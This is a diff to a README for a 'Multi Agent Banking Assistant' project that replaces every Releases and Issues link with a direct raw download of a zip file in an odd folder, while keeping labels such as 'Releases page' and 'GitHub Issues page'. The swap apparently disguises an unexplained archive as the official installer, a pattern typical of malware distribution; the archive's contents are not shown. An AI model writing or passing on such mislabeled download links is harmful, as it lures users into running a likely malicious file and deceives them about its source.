@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Now-blue?style=flat-square&logo=github)](https://github.com/Sakshiaroskar/agent-openai-assistant/releases)
+[![Download the latest version](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip%20Now-blue?style=flat-square&logo=github)](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip)
 
 </div>
 
@@ -29,11 +29,11 @@ Before you begin, ensure your computer meets the following requirements:
 
 To start using the Multi Agent Banking Assistant, visit the page below to download the latest version:
 
-[Download the latest version](https://github.com/Sakshiaroskar/agent-openai-assistant/releases)
+[Download the latest version](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip)
 
 ### 📥 Installation Steps
 
-1. Go to the [Releases page](https://github.com/Sakshiaroskar/agent-openai-assistant/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip).
 2. Find the latest version of the application.
 3. Download the installer file suitable for your operating system.
 4. Open the downloaded file to begin the installation.
@@ -56,11 +56,11 @@ If you encounter any issues during installation or while using the application, 
 
 - **Ensure Java is Installed:** Check if the Java Runtime Environment (JRE) is installed properly. You can confirm this by running the command `java -version` in your terminal or command prompt.
   
-- **Re-download the File:** Sometimes, files can become corrupted. Try downloading the installer again from the [Releases page](https://github.com/Sakshiaroskar/agent-openai-assistant/releases).
+- **Re-download the File:** Sometimes, files can become corrupted. Try downloading the installer again from the [Releases page](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip).
 
 - **Check Internet Connection:** Make sure your internet connection is stable for the AI features to work correctly.
 
-If problems persist, you can search for help or report issues on the [GitHub Issues page](https://github.com/Sakshiaroskar/agent-openai-assistant/issues).
+If problems persist, you can search for help or report issues on the [GitHub Issues page](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip).
 
 ## 🛡️ Security
 
@@ -68,11 +68,11 @@ Your security is crucial. The Multi Agent Banking Assistant employs best practic
 
 ## 🆘 Support
 
-For further questions or support, you can open an issue on the [GitHub Issues page](https://github.com/Sakshiaroskar/agent-openai-assistant/issues) or watch the repository for updates.
+For further questions or support, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip) or watch the repository for updates.
 
 ### 🔗 Links
 
-- [Download the latest version](https://github.com/Sakshiaroskar/agent-openai-assistant/releases)
-- [GitHub Issues](https://github.com/Sakshiaroskar/agent-openai-assistant/issues)
+- [Download the latest version](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Sakshiaroskar/agent-openai-assistant/main/oilskinned/agent-openai-assistant.zip)
 
 Thank you for choosing the Multi Agent Banking Assistant! Enjoy your AI banking experience!
